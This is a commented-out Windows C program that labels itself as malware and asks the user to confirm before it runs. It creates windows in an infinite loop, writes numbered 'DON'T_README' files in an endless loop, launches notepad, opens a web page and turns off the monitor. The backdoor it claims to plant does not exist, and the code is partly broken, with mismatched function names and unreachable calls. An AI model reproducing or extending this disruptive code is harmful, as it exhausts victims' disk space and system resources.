// #include <stdio.h>
// #include <windows.h>
// void create_files ();

// void create_process ();

// void shut_down_pc();


// LRESULT CALLBACK window_proc (HWND hnd , UINT message , WPARAM wp , LPARAM lp);



// int main (int argc , char *argv [])
// {
//     if(MessageBox(NULL,TEXT("THIS IS MALWARE \n IT WILL CREATE FILES \n CREATE A PROCESS AND A BACKDOOR \n SHUTTINGDOWN YOUR PC AND SO ON \n RUN ??"),NULL,MB_ICONWARNING | MB_YESNO)!=IDYES) return EXIT_SUCCESS;


//     WNDCLASS ws = {0};
//     ws.lpszClassName = L"MY_window";
//     ws.hbrBackground = (HBRUSH )(COLOR_WINDOW +1);
//     ws.hCursor = LoadCursor(NULL,IDC_ARROW);
//     ws.hIcon = LoadIcon(NULL,IDI_APPLICATION);
//     ws.hInstance = NULL;
//     ws.lpfnWndProc = window_proc;



//     if (!RegisterClass(&ws))
//     {
//         return EXIT_SUCCESS ;
//     }

//     while (TRUE){
//     HWND hnd = CreateWindow(
//         ws.lpszClassName, TEXT("65-750FX-Gtx000x7F"),WS_VISIBLE | WS_OVERLAPPEDWINDOW , 100,100,500,500,
//         NULL,NULL,NULL,NULL
//     );
// }

//     MSG msg= {0};
    

//     while (GetMessage(&msg,NULL,0,0))
//     {
//         TranslateMessage(&msg);
//         DispatchMessage(&msg);
//     }
        
//         create_process();
//         shutdown_pc();
//         create_files();
//         create_files();
//     return EXIT_SUCCESS;
// }



// LRESULT CALLBACK window_proc (HWND hnd , UINT message , WPARAM wp , LPARAM lp)

// {

//         switch (message)
//         {
//             case WM_DESTROY:
//                 PostQuitMessage(0);
//                 break;


//             default:
//                 return DefWindowProc(hnd , message,wp,lp);    
//         }
//         return EXIT_SUCCESS;

// }



// void create_files ()

// {

//     char file [512];
//     int c = 0;
//     while (TRUE)
//     {
//         sprintf(file,"DON'T_README%d.php",c++);
//         HANDLE hnd = CreateFile(
//             file,
//             GENERIC_WRITE,
//             NULL,
//             NULL,
//             CREATE_ALWAYS,
//             FILE_ATTRIBUTE_NORMAL,
//             NULL
//         );
//         if (hnd == INVALID_HANDLE_VALUE)
//         {
//             printf ("(-) The files creation request couldn't be generated %ld",GetLastError());
//         }


//         CloseHandle(hnd);


//     }


    
// }


// void create_process ()
// {
//     STARTUPINFO Si = {0}; PROCESS_INFORMATION pi = {0};

//         if (!CreateProcessW(
//             L"C:\\Windows\\system32\\notepad.exe",
//             NULL,
//             NULL,
//             NULL,
//             FALSE,
//             BELOW_NORMAL_PRIORITY_CLASS,
//             NULL,
//             NULL,
//             &Si,
//             &pi
//         )){
             
//              printf ("The process could'nt be created at this instance %ld",GetLastError());
             
//         }

//         printf ("(-) The pid of the current process execution is %d",pi.dwProcessId);   


// }


// void shutdown_pc ()
// {

//     ShellExecute(NULL,"open","https://www.youtube.com",NULL,NULL,SW_NORMAL);
//     SendMessage(HWND_BROADCAST , WM_SYSCOMMAND,SC_MONITORPOWER,(LPARAM)2);
// // }
// }
